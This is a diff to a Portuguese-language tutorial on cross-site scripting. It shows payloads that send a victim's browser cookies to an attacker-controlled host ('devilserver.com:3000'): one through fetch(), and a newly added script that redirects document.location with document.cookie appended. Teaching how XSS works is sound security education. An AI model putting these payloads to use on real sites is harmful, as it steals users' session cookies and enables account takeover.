@@ -17,3 +17,11 @@ fetch("http://devilserver.com:3000/?cookie="+document.cookie)
 ```
 
 Lembrando que podemos informar qualquer informação que o JavaScript tenha acesso.
+
+Caso o navegador do usuário não tenha suporte ao `fetch` podemos usar do redirecionamento para o site que queremos, que seria o mesmo que forçar a vítima a fazer um `GET`.
+
+```html
+<script>
+	document.location = "http://devilserver.com:3000/?cookie="+document.cookie
+</script>
+```
